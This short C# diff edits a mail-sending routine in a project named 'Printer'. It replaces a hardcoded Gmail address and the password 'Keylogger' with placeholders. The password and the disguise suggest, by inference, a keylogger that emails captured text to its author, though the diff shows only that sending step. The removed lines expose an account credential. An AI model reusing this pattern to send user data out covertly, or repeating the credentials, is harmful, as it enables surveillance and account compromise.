@@ -303,12 +303,12 @@ namespace Printer
                 MailMessage mailMessage = new MailMessage();
                 
 
-                mailMessage.From = new MailAddress("groparumirel@gmail.com");
-                mailMessage.To.Add("groparumirel@gmail.com");
+                mailMessage.From = new MailAddress("EMAIL");
+                mailMessage.To.Add("EMAIL");
                 mailMessage.Subject = subject;
                 client.UseDefaultCredentials = false;
                 client.EnableSsl = true;
-                client.Credentials = new System.Net.NetworkCredential("groparumirel@gmail.com", "Keylogger");
+                client.Credentials = new System.Net.NetworkCredential("EMAIL", "PASSWORD");
                 mailMessage.Body = emailBody;
 
                 client.Send(mailMessage);
